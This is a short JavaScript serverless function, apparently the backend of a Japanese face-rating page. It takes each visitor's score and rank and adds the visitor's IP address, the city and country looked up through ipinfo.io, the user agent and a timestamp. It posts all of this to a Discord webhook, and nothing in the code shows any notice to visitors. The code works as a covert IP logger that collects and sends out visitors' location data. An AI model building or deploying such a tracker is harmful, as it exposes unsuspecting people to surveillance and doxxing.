exports.handler = async (event) => {
  const webhook = process.env.DISCORD_WEBHOOK_URL;
  const ipinfoToken = process.env.IPINFO_TOKEN;

  if (!webhook) {
    return {
      statusCode: 500,
      body: "Webhook not set"
    };
  }

  const body = JSON.parse(event.body || "{}");

  const ip =
    event.headers["x-forwarded-for"]?.split(",")[0] ||
    event.headers["client-ip"] ||
    "unknown";

  const ua = event.headers["user-agent"] || "unknown";

  let country = "unknown";
  let city = "unknown";

  if (ipinfoToken) {
    try {
      const res = await fetch(
        `https://ipinfo.io/${ip}?token=${ipinfoToken}`
      );
      const data = await res.json();
      country = data.country || country;
      city = data.city || city;
    } catch {}
  }

  const time = new Date().toLocaleString("ja-JP", {
    timeZone: "Asia/Tokyo"
  });

  const message =
`📸 顔診断結果
黄金比：${body.score}%
ランク：${body.rank}

🌍 国：${country}
🏙️ 都市：${city}
🌐 IP：${ip}
🖥️ UA：${ua}
⏰ 時刻：${time}`;

  await fetch(webhook, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: message })
  });

  return {
    statusCode: 200,
    body: "sent"
  };
};
